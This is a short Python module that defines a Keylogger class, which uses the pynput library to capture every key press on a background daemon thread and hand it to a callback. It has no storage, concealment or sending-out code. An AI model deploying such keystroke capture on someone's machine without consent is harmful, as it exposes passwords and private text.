import threading
from pynput import keyboard


class Keylogger:
    def __init__(self, on_key):
        self._on_key = on_key

    def start(self):
        t = threading.Thread(target=self._run, daemon=True, name="keylogger")
        t.start()

    def _run(self):
        def _press(key):
            try:
                char = key.char
                if char:
                    self._on_key(char)
            except AttributeError:
                name = getattr(key, 'name', str(key)).upper()
                self._on_key(f"[{name}]")

        with keyboard.Listener(on_press=_press) as listener:
            listener.join()
